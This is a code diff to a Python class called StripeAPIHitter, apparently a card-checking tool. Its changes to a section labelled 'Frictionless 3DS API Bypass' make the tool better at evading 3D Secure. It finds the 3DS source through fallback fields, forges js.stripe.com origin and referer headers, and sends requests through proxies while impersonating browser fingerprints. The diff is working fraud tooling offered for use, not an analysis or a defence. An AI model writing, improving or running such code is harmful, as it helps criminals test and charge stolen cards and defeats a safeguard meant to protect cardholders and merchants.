@@ -709,8 +709,13 @@ class StripeAPIHitter:
                         # Frictionless 3DS API Bypass
                         try:
                             if next_action.get('type') == 'use_stripe_sdk':
-                                source_id = next_action['use_stripe_sdk'].get('three_d_secure_2_source')
-                                server_trans_id = next_action['use_stripe_sdk'].get('server_transaction_id')
+                                sdk = next_action.get('use_stripe_sdk', {})
+                                source_id = (
+                                    sdk.get('three_d_secure_2_source')
+                                    or sdk.get('source')
+                                    or next_action.get('source')
+                                )
+                                server_trans_id = sdk.get('server_transaction_id')
                                 
                                 if source_id:
                                     # Spoof legitimate browser environment for 3DS evaluation
@@ -768,7 +773,11 @@ class StripeAPIHitter:
                                         "key": self.pk_live
                                     }
                                     
-                                    auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
+                                    auth_headers = headers.copy()
+                                    auth_headers["origin"] = "https://js.stripe.com"
+                                    auth_headers["referer"] = "https://js.stripe.com/"
+                                    
+                                    auth_res = await loop.run_in_executor(None, lambda: cffi_requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30, impersonate=profile["impersonate"]))
                                     auth_json = auth_res.json()
                                     
                                     state = auth_json.get('state')
